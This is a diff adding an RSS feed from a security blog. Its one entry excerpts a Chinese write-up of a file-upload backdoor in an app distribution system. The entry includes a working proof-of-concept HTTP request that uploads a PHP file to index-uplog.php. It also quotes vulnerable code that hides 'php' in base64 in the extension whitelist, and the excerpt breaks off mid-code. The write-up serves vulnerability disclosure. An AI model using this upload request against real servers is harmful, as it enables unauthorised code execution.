@@ -1,0 +1,25 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>earcms on F0rmat&#39;Blog</title>
+    <link>https://getshe11.com/tags/earcms/</link>
+    <description>Recent content in earcms on F0rmat&#39;Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Fri, 06 Sep 2019 10:47:03 +0000</lastBuildDate><atom:link href="https://getshe11.com/tags/earcms/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>某云分发APP上传漏洞</title>
+      <link>https://getshe11.com/posts/an-app-distribution-system-upload-vulnerability/</link>
+      <pubDate>Fri, 06 Sep 2019 10:47:03 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/an-app-distribution-system-upload-vulnerability/</guid>
+      <description>0x01 前言 大概有几个月没写文章了，最近都在忙(咸鱼),在某此渗透行动中发现的一个洞，感觉是开发留的一个后门。
+0x02 漏洞复现 Payload：
+POST /source/pack/upload/index-uplog.php HTTP/1.1 Host: 127.0.0.1 Connection: close User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZWa8hDK6XlSEJhi7 Accept: */* Accept-Language: zh-CN,zh;q=0.9 Content-Length: 322 ------WebKitFormBoundaryZWa8hDK6XlSEJhi7 Content-Disposition: form-data; name=&amp;quot;app&amp;quot;; filename=&amp;quot;Lighthouse.php&amp;quot; Content-Type: image/jpeg &amp;lt;?php phpinfo();;unlink(__FILE__);?&amp;gt; ------WebKitFormBoundaryZWa8hDK6XlSEJhi7 Content-Disposition: form-data; name=&amp;quot;time&amp;quot; test ------WebKitFormBoundaryZWa8hDK6XlSEJhi7-- 执行后会在\data\tmp下生成test.php文件
+访问url:http://127.0.0.1/data/tmp/test.php
+0x03 漏洞分析 漏洞文件位置:source/pack/upload/index-uplog.php
+&amp;lt;?php if(!empty($_FILES)){ $filepart = pathinfo($_FILES[&amp;#39;app&amp;#39;][&amp;#39;name&amp;#39;]); $extension = strtolower($filepart[&amp;#39;extension&amp;#39;]); if(in_array($extension,array(&amp;#39;ipa&amp;#39;,&amp;#39;apk&amp;#39;,base64_decode(&amp;#39;cGhw&amp;#39;)))){ $time = $_POST[&amp;#39;time&amp;#39;]; $dir = &amp;#39;../../../data/tmp/&amp;#39;.$time.&amp;#39;/&amp;#39;; if(!</description>
+    </item>
+    
+  </channel>
+</rss>
